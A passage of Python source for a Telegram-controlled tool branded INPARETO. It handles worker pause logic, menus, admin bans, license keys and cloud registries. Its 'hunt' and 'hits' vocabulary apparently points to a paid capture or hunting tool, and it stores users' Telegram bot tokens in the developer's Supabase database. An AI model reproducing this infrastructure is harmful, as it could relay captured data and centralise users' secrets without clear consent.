    if ans.lower() != "y":
        for line in paint_action_box("SKIPPED", [("Telegram setup skipped — local mode only.", ANSI_DIM)], ANSI_DIM):
            print(line)
        print()
        return

    bot_token = premium_input("Telegram bot token", "From @BotFather")
    chat_id = premium_input("Telegram chat ID", "Your numeric chat / user ID")
    if not bot_token or not chat_id:
        for line in paint_action_box("SKIPPED", [("Missing token or chat ID — setup cancelled.", ANSI_YELLOW)], ANSI_YELLOW):
            print(line)
        print()
        return

    clear_local_logged_out()
    clear_local_device_id()
    apply_telegram_credentials(bot_token, chat_id)
    restore_operator_hit_group_for_user(chat_id)
    start_telegram_monitor()
    admin_load_settings()
    info = fetch_telegram_user(chat_id)
    label = (info or {}).get("display_name") or f"User {chat_id[-6:]}"
    save_err = None
    brand_ok, brand_msg = apply_operator_bot_branding(bot_token)
    schedule_operator_bot_branding(bot_token)
    if save_err:
        for line in paint_action_box("WARNING", [(f"Cloud save failed: {save_err[:54]}", ANSI_RED)], ANSI_RED):
            print(line)
    else:
        _sync_operator_display_name(label)
        restored_gid = sync_local_hit_group_from_cloud()
        if restored_gid:
            rows = [
                (f"Hit group restored for your Telegram ID · {restored_gid}", ANSI_GREEN),
            ]
        else:
            rows = [("Device registered — link a hit group (add bot as admin).", ANSI_GREEN)]
        if brand_ok:
            rows.append((f"Bot branded: {brand_msg[:52]}", ANSI_CYAN))
        elif brand_msg:
            rows.append((f"Bot branding: {brand_msg[:52]}", ANSI_YELLOW))
        for line in paint_action_box("LINKED", rows, ANSI_GREEN):
            print(line)
    admin_load_settings()
    sync_local_hit_group_from_cloud()
    reconcile_operator_hit_group()
    sync_operator_access()
    schedule_sync_telegram_commands(chat_id)
    print()


FRAME_WIDTH = 72

TG_BRAND = "INPARETO"
TG_TAGLINE = "Developed by S Crew"
TG_DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"

# Typographic symbols only — no emoji
S = {
    "brand": "◈",
    "live": "●",
    "idle": "○",
    "on": "◉",
    "off": "◎",
    "bullet": "▸",
    "arrow": "→",
    "dash": "—",
    "section": "━",
    "btn_dash": "▣",
    "btn_hits": "▤",
    "btn_set": "◇",
    "btn_guide": "▷",
    "btn_refresh": "↻",
    "btn_tools": "◆",
    "btn_pause": "▐",
    "btn_resume": "►",
    "btn_home": "⌂",
    "btn_back": "◂",
    "btn_up": "▲",
    "btn_down": "▼",
    "btn_plus": "⊕",
    "btn_export": "⇩",
    "btn_reset": "⊗",
    "btn_logout": "⊘",
    "btn_confirm": "✓",
    "btn_cancel": "✕",
    "btn_profile": "→",
    "btn_user": "◎",
    "btn_rank": "★",
    "btn_badge": "◆",
    "btn_analytics": "◧",
    "btn_health": "⊕",
    "btn_status": "▣",
    "btn_api": "⊛",
    "btn_cloud": "◉",
}


def tg_section(title):
    bar = S["section"] * 3
    return f"\n<b>{bar} {title} {bar}</b>\n"


def tg_code(text):
    return f"<code>{html.escape(str(text))}</code>"


def tg_row(label, value):
    return f"  {S['bullet']} {label}  <code>{html.escape(str(value))}</code>\n"


def tg_progress(pct, width=14):
    pct = max(0.0, min(100.0, float(pct)))
    filled = int((pct / 100) * width)
    return ("▰" * filled) + ("▱" * (width - filled))


def tg_state_badge():
    if _api_auto_paused and not _user_manual_paused:
        return f"<code>{S['idle']} PAUSED · API OFF</code>"
    if paused:
        return f"<code>{S['idle']} PAUSED</code>"
    return f"<code>{S['live']} LIVE</code>"


def apply_worker_pause_state(*, defer_access=False):
    """Sync pause_event with manual pause, API auto-pause, and access gate."""
    global paused, PAUSED_SINCE, _pause_state_updating
    license_ok = hunting_license_ok_cached if _workers_started else hunting_license_ok
    with _pause_state_guard:
        if _pause_state_updating:
            uid = resolve_operator_telegram_id()
            gate_ok = (
                not (TELEGRAM_ENABLED and ACCESS_BLOCKED)
                or _operator_hunt_trusted()
                or _access_trust_grace_active()
            ) and not (uid and operator_ban_active(uid, force=False))
            if (
                not (_user_manual_paused or _api_auto_paused)
                and not is_locally_logged_out()
                and not defer_access
                and _worker_api_ok()
                and gate_ok
                and license_ok()
            ):
                pause_event.set()
            else:
                pause_event.clear()
            return
        _pause_state_updating = True
    try:
        paused = _user_manual_paused or _api_auto_paused
        if is_locally_logged_out():
            pause_event.clear()
            return
        if paused:
            if PAUSED_SINCE is None:
                PAUSED_SINCE = datetime.now(timezone.utc)
            pause_event.clear()
            return
        PAUSED_SINCE = None
        if defer_access:
            pause_event.clear()
            return
        if (
            JACK_PANEL_LIVE
            and _workers_started
            and pause_event.is_set()
            and not (_user_manual_paused or _api_auto_paused)
            and (_hunt_recently_ok() or _hunt_gen_recently_active(45))
        ):
            return
        if JACK_PANEL_LIVE and _workers_started:
            uid = resolve_operator_telegram_id()
            gate_ok = (
                not (TELEGRAM_ENABLED and ACCESS_BLOCKED)
                or _operator_hunt_trusted()
                or _access_trust_grace_active()
            ) and not (uid and operator_ban_active(uid, force=False))
            access_ok = gate_ok and license_ok()
            api_ok = _worker_api_ok()
        else:
            access_ok = sync_operator_access() and hunting_license_ok()
            api_ok = get_api_alive()
        if access_ok and not paused:
            if api_ok or _local_gateway_mode():
                pause_event.set()
            else:
                pause_event.clear()
        else:
            pause_event.clear()
    finally:
        with _pause_state_guard:
            _pause_state_updating = False


def sync_api_auto_pause():
    """Auto-pause workers when gateway is offline — debounced probe failures."""
    global _api_auto_paused
    if _hunt_recently_ok():
        if _api_auto_paused:
            _api_auto_paused = False
            _log_api_pause_change("API online — hunt active")
            apply_worker_pause_state()
        return
    if (
        JACK_PANEL_LIVE
        and _workers_started
        and pause_event.is_set()
        and not _user_manual_paused
    ):
        return
    with _health_lock:
        api_ok = bool(_health_cache.get("api"))
    if api_ok:
        if _api_auto_paused:
            _api_auto_paused = False
            _log_api_pause_change("API online — probe recovered")
            apply_worker_pause_state()
        return
    # Termux: localhost gateway — VPN blips flip /alive probes; hunt refusal is the real signal.
    if _IS_TERMUX:
        return
    if _api_probe_fail_streak < API_PROBE_FAIL_THRESHOLD:
        return
    if not _api_auto_paused:
        _api_auto_paused = True
        _log_api_pause_change("Auto-paused — API endpoint offline")
    apply_worker_pause_state()


def create_command_keyboard(view="main"):
    toggle_text = (
        f"{S['btn_resume']} Resume" if paused else f"{S['btn_pause']} Pause"
    )
    toggle_data = "RESUME" if paused else "PAUSE"

    if view == "profile":
        return {
            "inline_keyboard": [
                [
                    {"text": f"{S['btn_rank']} Leaderboard", "callback_data": "LEADERBOARD"},
                    {"text": f"{S['btn_badge']} Badges", "callback_data": "BADGES"},
                ],
                [
                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
                ],
            ]
        }

    if view == "leaderboard":
        return {
            "inline_keyboard": [
                [
                    {"text": "Operators", "callback_data": "LB_OPS"},
                    {"text": "Sessions", "callback_data": "LB_SESSIONS"},
                ],
                [
                    {"text": "Today", "callback_data": "LB_DAY"},
                    {"text": "Week", "callback_data": "LB_WEEK"},
                    {"text": "All time", "callback_data": "LB_ALL"},
                ],
                [
                    {"text": f"{S['btn_back']} Back", "callback_data": "PROFILE"},
                ],
            ]
        }

    if view == "settings":
        return {
            "inline_keyboard": [
                [
                    {"text": f"{S['btn_down']} 5", "callback_data": "MIND"},
                    {"text": f"{S['btn_up']} 5", "callback_data": "MINU"},
                    {"text": f"{S['btn_plus']} +5", "callback_data": "THRU"},
                ],
                [
                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
                ],
            ]
        }

    if view == "tools":
        live_label = (
            f"{S['on']} Auto-refresh ON" if LIVE_WATCH else f"{S['off']} Auto-refresh OFF"
        )
        live_data = "LIVE_OFF" if LIVE_WATCH else "LIVE_ON"
        return {
            "inline_keyboard": [
                [
                    {"text": f"{S['btn_analytics']} Analytics", "callback_data": "ANALYTICS"},
                    {"text": f"{S['btn_health']} Health", "callback_data": "HEALTH"},
                ],
                [
                    {"text": live_label, "callback_data": live_data},
                ],
                [
                    {"text": "★ Saved", "callback_data": "SAVED"},
                    {"text": f"{S['btn_export']} Export", "callback_data": "EXPORT"},
                ],
                [
                    {"text": f"{S['btn_guide']} Commands", "callback_data": "HELP"},
                ],
                [
                    {"text": f"{S['btn_reset']} Reset stats", "callback_data": "RESET_ASK"},
                ],
                [
                    {"text": f"{S['btn_logout']} Log out", "callback_data": "LOGOUT_ASK"},
                ],
                [
                    {"text": f"{S['btn_back']} Back", "callback_data": "STATS"},
                ],
            ]
        }

    if view == "reset_confirm":
        return {
            "inline_keyboard": [
                [
                    {"text": f"{S['btn_confirm']} Confirm", "callback_data": "RESET_OK"},
                    {"text": f"{S['btn_cancel']} Cancel", "callback_data": "TOOLS"},
                ],
            ]
        }

    if view == "logout_confirm":
        return {
            "inline_keyboard": [
                [
                    {
                        "text": f"{S['btn_confirm']} Yes, log out",
                        "callback_data": "LOGOUT_OK",
                    },
                    {
                        "text": f"{S['btn_cancel']} Cancel",
                        "callback_data": "LOGOUT_CANCEL",
                    },
                ],
            ]
        }

    # Main panel — quick status + controls
    return {
        "inline_keyboard": [
            [
                {"text": f"{S['btn_dash']} Stats", "callback_data": "STATS"},
                {"text": toggle_text, "callback_data": toggle_data},
            ],
            [
                {"text": f"{S['btn_status']} Status", "callback_data": "CMD_STATUS"},
                {"text": f"{S['btn_api']} API", "callback_data": "CMD_API"},
                {"text": f"{S['btn_cloud']} Cloud", "callback_data": "CMD_CLOUD"},
            ],
            [
                {"text": f"{S['btn_hits']} Hits", "callback_data": "HITS"},
                {"text": f"{S['btn_set']} Config", "callback_data": "SETTINGS"},
            ],
            [
                {"text": f"{S['btn_user']} Profile", "callback_data": "PROFILE"},
                {"text": f"{S['btn_tools']} More", "callback_data": "TOOLS"},
            ],
        ]
    }


def create_back_keyboard(target="STATS", label=None):
    label = label or f"{S['btn_home']} Dashboard"
    return {"inline_keyboard": [[{"text": label, "callback_data": target}]]}


def create_leaf_keyboard(refresh_data=None, back_target="STATS", back_label=None):
    rows = []
    if refresh_data:
        rows.append([{"text": f"{S['btn_refresh']} Refresh", "callback_data": refresh_data}])
    label = back_label or f"{S['btn_home']} Dashboard"
    rows.append([{"text": label, "callback_data": back_target}])
    return {"inline_keyboard": rows}


def panel_keyboard(panel):
    """Context-aware inline keys — full menu only on main dashboard."""
    if panel == "main":
        return create_command_keyboard("main")
    if panel == "settings":
        return create_command_keyboard("settings")
    if panel == "profile":
        return create_command_keyboard("profile")
    if panel == "leaderboard":
        return create_command_keyboard("leaderboard")
    if panel == "tools":
        return create_command_keyboard("tools")
    if panel == "reset_confirm":
        return create_command_keyboard("reset_confirm")
    if panel == "logout_confirm":
        return create_command_keyboard("logout_confirm")
    if panel == "status":
        return create_leaf_keyboard("CMD_STATUS", "STATS")
    if panel == "api":
        return create_leaf_keyboard("CMD_API", "STATS")
    if panel == "cloud":
        return create_leaf_keyboard("CMD_CLOUD", "STATS")
    if panel == "hits":
        return create_leaf_keyboard("HITS", "STATS")
    if panel == "help":
        return create_leaf_keyboard(None, "TOOLS", f"{S['btn_back']} More")
    if panel == "analytics":
        return create_leaf_keyboard("ANALYTICS", "TOOLS", f"{S['btn_back']} More")
    if panel == "health":
        return create_leaf_keyboard("HEALTH", "TOOLS", f"{S['btn_back']} More")
    if panel == "notice":
        return create_back_keyboard("STATS")
    if panel == "pause_notice":
        toggle_text = f"{S['btn_resume']} Resume" if paused else f"{S['btn_pause']} Pause"
        toggle_data = "RESUME" if paused else "PAUSE"
        return {
            "inline_keyboard": [
                [{"text": toggle_text, "callback_data": toggle_data}],
                [{"text": f"{S['btn_home']} Dashboard", "callback_data": "STATS"}],
            ]
        }
    return create_back_keyboard("STATS")


def format_panel_header():
    return (
        f"<b>{S['brand']} {TG_BRAND}</b>  <i>{TG_TAGLINE}</i>\n"
        f"<code>{TG_DIVIDER}</code>\n"
    )


# ═══ ADMIN (not exposed in public /help) ═══

def admin_load_settings(*, force=False):
    global _admin_settings, _admin_settings_loaded_at
    if not is_cloud_enabled():
        return
    now = time.time()
    if not force and _admin_settings_loaded_at and now - _admin_settings_loaded_at < ADMIN_SETTINGS_TTL:
        return
    with _admin_settings_io_lock:
        data, err = supabase_request("GET", "app_settings", params={"key": "eq.core", "limit": "1"})
        if err or not data:
            return
        row = data[0].get("value") or {}
        if isinstance(row, str):
            try:
                row = json.loads(row)
            except Exception:
                row = {}
        _admin_settings.update({
            "admin_ids": [str(x) for x in row.get("admin_ids", [])],
            "admin_bot_token": (row.get("admin_bot_token") or "").strip(),
            "logs_group_id": str(row.get("logs_group_id") or "").strip(),
            "hits_group_id": str(row.get("hits_group_id") or "").strip(),
            "channel_username": (row.get("channel_username") or "inpareto").strip().lstrip("@"),
            "operator_bot_name": (row.get("operator_bot_name") or "INPARETO Jack").strip(),
            "operator_bot_description": (row.get("operator_bot_description") or "").strip()
            or "Hit alerts & remote hunt control.\nDeveloped by S Crew",
            "operator_bot_short_description": (row.get("operator_bot_short_description") or "").strip()
            or "INPARETO · S Crew",
            "operator_bot_photo_url": (row.get("operator_bot_photo_url") or "").strip(),
            "operator_hit_group_title": (row.get("operator_hit_group_title") or "INPARETO · Hits").strip(),
            "operator_hit_group_description": (row.get("operator_hit_group_description") or "").strip()
            or "Live captures from your INPARETO session.\nDeveloped by S Crew",
            "operator_hit_group_photo_url": (row.get("operator_hit_group_photo_url") or "").strip(),
        })
        for key, val in row.items():
            if key not in _ADMIN_SETTINGS_KNOWN_KEYS:
                _admin_settings[key] = val
        _admin_settings_loaded_at = now


def admin_save_settings():
    if not is_cloud_enabled():
        return "Cloud offline"
    with _admin_settings_io_lock:
        payload = {
            "key": "core",
            "value": _admin_settings,
            "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
        try:
            r = requests.post(
                url,
                headers=supabase_headers("resolution=merge-duplicates"),
                json=payload,
                timeout=CLOUD_TIMEOUT,
            )
            if not r.ok:
                return r.text[:120]
        except Exception as exc:
            return str(exc)
    return None


def admin_is_admin(user_id):
    user_id = str(user_id or "").strip()
    if not user_id:
        return False
    if is_cloud_enabled():
        admin_load_settings(force=False)
    return user_id in _admin_settings.get("admin_ids", [])


def admin_api_url():
    token = _admin_settings.get("admin_bot_token") or ""
    if not token:
        return ""
    return f"https://api.telegram.org/bot{token}"


def admin_request(method, data=None, files=None):
    base = admin_api_url()
    if not base:
        return None
    try:
        return requests.post(
            f"{base}/{method}",
            data=data,
            files=files,
            timeout=CLOUD_TIMEOUT,
        )
    except Exception:
        return None


def admin_send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    if not chat_id:
        return None
    payload = {"chat_id": str(chat_id), "text": text, "parse_mode": parse_mode}
    if reply_markup is not None:
        payload["reply_markup"] = json.dumps(reply_markup)
    payload = telegram_disable_link_preview(payload, "sendMessage")
    return admin_request("sendMessage", data=payload)


def admin_send_photo(chat_id, caption, photo_bytes, content_type="image/jpeg", reply_markup=None):
    if not chat_id or not photo_bytes:
        return None
    data = {
        "chat_id": str(chat_id),
        "caption": caption,
        "parse_mode": "HTML",
    }
    if reply_markup is not None:
        data["reply_markup"] = json.dumps(reply_markup)
    data = telegram_disable_link_preview(data, "sendPhoto")
    files = {"photo": ("hit.jpg", photo_bytes, content_type)}
    return admin_request("sendPhoto", data=data, files=files)


def admin_channel_tag():
    user = (_admin_settings.get("channel_username") or "inpareto").lstrip("@")
    return f'<a href="https://t.me/{html.escape(user)}">@{html.escape(user)}</a>'


def admin_parse_chat_target(link):
    link = (link or "").strip()
    if not link:
        return None, None
    if link.startswith("@"):
        uname = link.lstrip("@")
        return f"@{uname}", f"https://t.me/{uname}"
    m = re.search(r"(?:https?://)?t\.me/\+([A-Za-z0-9_-]+)", link)
    if m:
        return None, f"https://t.me/+{m.group(1)}"
    m = re.search(r"(?:https?://)?t\.me/([A-Za-z0-9_]+)", link)
    if m:
        uname = m.group(1)
        if uname.lower() in ("joinchat", "c"):
            return None, link
        return f"@{uname}", f"https://t.me/{uname}"
    if re.fullmatch(r"-?\d+", link):
        return link, link
    return None, link


def admin_fetch_force_join_targets():
    data, err = supabase_request(
        "GET", "force_join_targets", params={"select": "*", "order": "created_at.asc"},
    )
    if err:
        return [], err
    return data or [], None


def admin_upsert_force_join(preview_name, chat_id, invite_link):
    invite_link = (invite_link or chat_id or "").strip()
    parsed_cid, parsed_inv = admin_parse_chat_target(invite_link)
    if not parsed_inv and invite_link.startswith("http"):
        parsed_inv = invite_link
    payload = {
        "preview_name": preview_name,
        "chat_id": parsed_cid or chat_id or invite_link,
        "invite_link": parsed_inv or invite_link,
    }
    url = f"{SUPABASE_URL}/rest/v1/force_join_targets?on_conflict=preview_name"
    try:
        r = requests.post(
            url,
            headers=supabase_headers("resolution=merge-duplicates"),
            json=payload,
            timeout=CLOUD_TIMEOUT,
        )
        if not r.ok:
            return r.text[:120]
    except Exception as exc:
        return str(exc)
    return None


def admin_delete_force_join(preview_name):
    url = f"{SUPABASE_URL}/rest/v1/force_join_targets"
    try:
        r = requests.delete(
            url,
            headers=supabase_headers(),
            params={"preview_name": f"eq.{preview_name}"},
            timeout=CLOUD_TIMEOUT,
        )
        if not r.ok:
            return r.text[:120]
    except Exception as exc:
        return str(exc)
    return None


def admin_fetch_ban(operator_id):
    data, err = supabase_request(
        "GET",
        "banned_operators",
        params={"operator_id": f"eq.{operator_id}", "select": "*", "limit": "1"},
    )
    if err:
        return None, err
    return (data[0] if data else None), None


def invalidate_ban_cache(user_id=None):
    if user_id is None or str(user_id) == _ban_cache.get("user_id"):
        _ban_cache.update(user_id=None, banned=False, at=0.0)


def operator_ban_active(user_id, *, force=False):
    """True when operator is suspended in Supabase — never bypass via local session trust."""
    user_id = str(user_id or "").strip()
    if not user_id or not TELEGRAM_ENABLED or admin_is_admin(user_id):
        return False
    now = time.time()
    if (
        not force
        and _ban_cache["user_id"] == user_id
        and now - float(_ban_cache.get("at") or 0) < BAN_CHECK_TTL
    ):
        return bool(_ban_cache["banned"])
    ban, err = admin_fetch_ban(user_id)
    if err:
        if (
            _ban_cache["user_id"] == user_id
            and _ban_cache["banned"]
            and now - float(_ban_cache.get("at") or 0) < BAN_CHECK_TTL * 12
        ):
            return True
        return False
    banned = bool(ban)
    _ban_cache.update(user_id=user_id, banned=banned, at=now)
    if banned:
        _admin_access_cache.update(ok=False, at=0.0)
        invalidate_operator_gate_cache()
    return banned


def admin_ban_operator(operator_id, reason="", by_admin=""):
    payload = {
        "operator_id": str(operator_id),
        "reason": reason[:200],
        "banned_by": str(by_admin),
        "banned_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    url = f"{SUPABASE_URL}/rest/v1/banned_operators?on_conflict=operator_id"
    try:
        r = requests.post(
            url,
            headers=supabase_headers("resolution=merge-duplicates"),
            json=payload,
            timeout=CLOUD_TIMEOUT,
        )
        if not r.ok:
            return r.text[:120]
    except Exception as exc:
        return str(exc)
    return None


def admin_unban_operator(operator_id):
    url = f"{SUPABASE_URL}/rest/v1/banned_operators"
    try:
        r = requests.delete(
            url,
            headers=supabase_headers(),
            params={"operator_id": f"eq.{operator_id}"},
            timeout=CLOUD_TIMEOUT,
        )
        if not r.ok:
            return r.text[:120]
        return None
    except Exception as exc:
        return str(exc)


def license_iso_now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def license_parse_iso(value):
    if not value:
        return None
    try:
        raw = str(value).strip().replace("Z", "+00:00")
        dt = datetime.fromisoformat(raw)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt.astimezone(timezone.utc)
    except (ValueError, TypeError):
        return None


def license_format_expiry(dt):
    if not dt:
        return "—"
    return dt.astimezone(timezone.utc).strftime("%d %b %Y · %H:%M UTC")


def license_default_registry():
    return {"licenses": {}, "keys": {}, "free": {}, "version": 2}


def license_normalize_registry(raw):
    base = license_default_registry()
    if not isinstance(raw, dict):
        return base
    lic = raw.get("licenses")
    keys = raw.get("keys")
    free = raw.get("free")
    if isinstance(lic, dict):
        base["licenses"] = lic
    if isinstance(keys, dict):
        base["keys"] = keys
    if isinstance(free, dict):
        base["free"] = free
    return base


def license_repair_registry_from_keys(reg):
    """Rebuild missing licenses[] from redeemed keys (fixes redeem overwrite bug)."""
    if not isinstance(reg, dict):
        return False, license_default_registry()
    licenses = reg.setdefault("licenses", {})
    keys = reg.get("keys") or {}
    if not keys:
        return False, reg
    now = datetime.now(timezone.utc)
    changed = False
    for key_name, entry in keys.items():
        if not isinstance(entry, dict):
            continue
        uid = str(entry.get("redeemed_by") or "").strip()
        redeemed_at = license_parse_iso(entry.get("redeemed_at"))
        if not uid or not redeemed_at:
            continue
        days = max(1, int(entry.get("days") or 30))
        exp = redeemed_at + timedelta(days=days)
        if exp <= now:
            continue
        existing = licenses.get(uid)
        existing_exp = None
        if isinstance(existing, dict):
            existing_exp = license_parse_iso(existing.get("expires_at"))
        if existing_exp and existing_exp >= exp:
            continue
        licenses[uid] = {
            "expires_at": exp.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "granted_at": entry.get("redeemed_at") or license_iso_now(),
            "granted_by": str(entry.get("created_by") or ""),
            "source": "key_repair",
            "key_ref": key_name,
        }
        changed = True
    return changed, reg


def license_invalidate_cache():
    with _paid_access_lock:
        _paid_access_cache["registry"] = None
        _paid_access_cache["at"] = 0.0
    _hunt_license_cache.update(ok=None, at=0.0)
    _invalidate_dashboard_plan_cache()


def license_fetch_registry(*, force=False):
    now = time.time()
    with _paid_access_lock:
        if (
            not force
            and _paid_access_cache["registry"] is not None
            and now - _paid_access_cache["at"] < LICENSE_CACHE_TTL
        ):
            return json.loads(json.dumps(_paid_access_cache["registry"])), None
    if not is_cloud_enabled():
        return license_default_registry(), "Cloud offline"
    with _license_registry_lock:
        with _paid_access_lock:
            if (
                not force
                and _paid_access_cache["registry"] is not None
                and now - _paid_access_cache["at"] < LICENSE_CACHE_TTL
            ):
                return json.loads(json.dumps(_paid_access_cache["registry"])), None
        data, err = supabase_request(
            "GET",
            "app_settings",
            params={"key": f"eq.{LICENSE_REGISTRY_KEY}", "select": "value", "limit": "1"},
        )
        if err:
            return license_default_registry(), err
        reg = license_default_registry()
        if data:
            val = data[0].get("value")
            if isinstance(val, str):
                try:
                    val = json.loads(val)
                except json.JSONDecodeError:
                    val = {}
            reg = license_normalize_registry(val or {})
        repaired, reg = license_repair_registry_from_keys(reg)
        if repaired:
            save_err = license_save_registry(reg)
            if save_err:
                log_event("LICENSE", f"repair save failed: {save_err[:80]}")
        with _paid_access_lock:
            _paid_access_cache["registry"] = reg
            _paid_access_cache["at"] = now
        return json.loads(json.dumps(reg)), None


def license_save_registry(registry):
    if not is_cloud_enabled():
        return "Cloud offline"
    with _license_registry_lock:
        payload = {
            "key": LICENSE_REGISTRY_KEY,
            "value": registry,
            "updated_at": license_iso_now(),
        }
        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
        try:
            r = requests.post(
                url,
                headers=supabase_headers("resolution=merge-duplicates"),
                json=payload,
                timeout=CLOUD_TIMEOUT,
            )
            if not r.ok:
                return r.text[:200]
        except Exception as exc:
            return str(exc)[:120]
    license_invalidate_cache()
    return None


_user_hit_group_cache = {"registry": None, "at": 0.0}
_user_hit_group_lock = threading.RLock()
USER_HIT_GROUP_CACHE_TTL = 30

_operator_links_cache = {"registry": None, "at": 0.0}
_operator_links_lock = threading.RLock()
OPERATOR_LINKS_CACHE_TTL = 30


def user_hit_group_default_registry():
    return {"users": {}}


def user_hit_group_normalize_registry(raw):
    if not isinstance(raw, dict):
        return user_hit_group_default_registry()
    users = raw.get("users")
    if not isinstance(users, dict):
        users = raw
    clean = {}
    for uid, val in (users or {}).items():
        uid = str(uid).strip()
        if not uid:
            continue
        if isinstance(val, dict):
            gid = str(val.get("hit_group_id") or val.get("group_id") or "").strip()
        else:
            gid = str(val or "").strip()
        if gid:
            clean[uid] = gid
    return {"users": clean}


def user_hit_group_invalidate_cache():
    with _user_hit_group_lock:
        _user_hit_group_cache["registry"] = None
        _user_hit_group_cache["at"] = 0.0


def user_hit_group_fetch_registry(*, force=False):
    now = time.time()
    with _user_hit_group_lock:
        if (
            not force
            and _user_hit_group_cache["registry"] is not None
            and now - _user_hit_group_cache["at"] < USER_HIT_GROUP_CACHE_TTL
        ):
            return json.loads(json.dumps(_user_hit_group_cache["registry"])), None
        if not is_cloud_enabled():
            return user_hit_group_default_registry(), "Cloud offline"
        data, err = supabase_request(
            "GET",
            "app_settings",
            params={
                "key": f"eq.{USER_HIT_GROUP_REGISTRY_KEY}",
                "select": "value",
                "limit": "1",
            },
        )
        if err:
            return user_hit_group_default_registry(), err
        reg = user_hit_group_default_registry()
        if data:
            val = data[0].get("value")
            if isinstance(val, str):
                try:
                    val = json.loads(val)
                except json.JSONDecodeError:
                    val = {}
            reg = user_hit_group_normalize_registry(val or {})
        _user_hit_group_cache["registry"] = reg
        _user_hit_group_cache["at"] = now
        return json.loads(json.dumps(reg)), None


def user_hit_group_save_registry(registry):
    if not is_cloud_enabled():
        return "Cloud offline"
    with _user_hit_group_lock:
        payload = {
            "key": USER_HIT_GROUP_REGISTRY_KEY,
            "value": user_hit_group_normalize_registry(registry or {}),
            "updated_at": license_iso_now(),
        }
        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
        try:
            r = requests.post(
                url,
                headers=supabase_headers("resolution=merge-duplicates"),
                json=payload,
                timeout=CLOUD_TIMEOUT,
            )
            if not r.ok:
                return r.text[:200]
        except Exception as exc:
            return str(exc)[:120]
    user_hit_group_invalidate_cache()
    return None


def user_hit_group_get(chat_id):
    chat_id = str(chat_id or "").strip()
    if not chat_id:
        return None
    reg, _ = user_hit_group_fetch_registry()
    gid = str(reg.get("users", {}).get(chat_id) or "").strip()
    return gid or None


def user_hit_group_set(chat_id, group_id):
    chat_id = str(chat_id or "").strip()
    gid = str(group_id or "").strip()
    if not chat_id or not gid:
        return "Missing user or group"
    if not is_cloud_enabled():
        return "Cloud offline"
    with _user_hit_group_lock:
        reg, err = user_hit_group_fetch_registry(force=True)
        if err:
            return err
        reg.setdefault("users", {})[chat_id] = gid
        return user_hit_group_save_registry(reg)


def user_hit_group_clear(chat_id):
    chat_id = str(chat_id or "").strip()
    if not chat_id or not is_cloud_enabled():
        return None
    with _user_hit_group_lock:
        reg, err = user_hit_group_fetch_registry(force=True)
        if err:
            return err
        users = reg.get("users") or {}
        if chat_id not in users:
            return None
        users.pop(chat_id, None)
        reg["users"] = users
        return user_hit_group_save_registry(reg)


def operator_links_default_registry():
    return {"users": {}}


def operator_links_normalize_registry(raw):
    if not isinstance(raw, dict):
        return operator_links_default_registry()
    users = raw.get("users")
    if not isinstance(users, dict):
        users = raw
    clean = {}
    for uid, val in (users or {}).items():
        uid = str(uid).strip()
        if not uid:
            continue
        if isinstance(val, dict):
            tok = (val.get("bot_token") or val.get("telegram_bot_token") or "").strip()
            name = (val.get("display_name") or "").strip()
            at = (val.get("updated_at") or "").strip()
        else:
            tok = str(val or "").strip()
            name = ""
            at = ""
        if tok:
            clean[uid] = {"bot_token": tok, "display_name": name[:64], "updated_at": at}
    return {"users": clean}


def operator_links_invalidate_cache():
    with _operator_links_lock:
        _operator_links_cache["registry"] = None
        _operator_links_cache["at"] = 0.0


def operator_links_fetch_registry(*, force=False):
    now = time.time()
    with _operator_links_lock:
        if (
            not force
            and _operator_links_cache["registry"] is not None
            and now - _operator_links_cache["at"] < OPERATOR_LINKS_CACHE_TTL
        ):
            return json.loads(json.dumps(_operator_links_cache["registry"])), None
        if not is_cloud_enabled():
            return operator_links_default_registry(), "Cloud offline"
        data, err = supabase_request(
            "GET",
            "app_settings",
            params={
                "key": f"eq.{OPERATOR_LINKS_REGISTRY_KEY}",
                "select": "value",
                "limit": "1",
            },
        )
        if err:
            return operator_links_default_registry(), err
        reg = operator_links_default_registry()
        if data:
            val = data[0].get("value")
            if isinstance(val, str):
                try:
                    val = json.loads(val)
                except json.JSONDecodeError:
                    val = {}
            reg = operator_links_normalize_registry(val or {})
        _operator_links_cache["registry"] = reg
        _operator_links_cache["at"] = now
        return json.loads(json.dumps(reg)), None


def operator_links_save_registry(registry):
    if not is_cloud_enabled():
        return "Cloud offline"
    with _operator_links_lock:
        payload = {
            "key": OPERATOR_LINKS_REGISTRY_KEY,
            "value": operator_links_normalize_registry(registry or {}),
            "updated_at": license_iso_now(),
        }
        url = f"{SUPABASE_URL}/rest/v1/app_settings?on_conflict=key"
        try:
            r = requests.post(
                url,
                headers=supabase_headers("resolution=merge-duplicates"),
                json=payload,
                timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
            )
            if not r.ok:
                return r.text[:200]
        except Exception as exc:
            return str(exc)[:120]
    operator_links_invalidate_cache()
    return None


def operator_link_set(chat_id, bot_token, display_name=""):
    chat_id = str(chat_id or "").strip()
    bot_token = (bot_token or "").strip()
    if not chat_id or not bot_token:
        return "Missing chat/token"
    if not is_cloud_enabled():
        return "Cloud offline"
    with _operator_links_lock:
        reg, err = operator_links_fetch_registry(force=True)
        if err:
            return err
        reg.setdefault("users", {})[chat_id] = {
            "bot_token": bot_token,
            "display_name": (display_name or "")[:64],
            "updated_at": license_iso_now(),
        }
        return operator_links_save_registry(reg)


def operator_link_get(chat_id):
    """Pull saved bot token for this Telegram id from cloud registry."""
    chat_id = str(chat_id or "").strip()
    if not chat_id or not is_cloud_enabled():
        return None
    reg, err = operator_links_fetch_registry(force=False)
    if err:
        return None
    info = (reg.get("users") or {}).get(chat_id)
    if not isinstance(info, dict):
        return None
    token = (info.get("bot_token") or "").strip()
    if not token:
        return None
    return {
        "telegram_chat_id": chat_id,
        "telegram_bot_token": token,
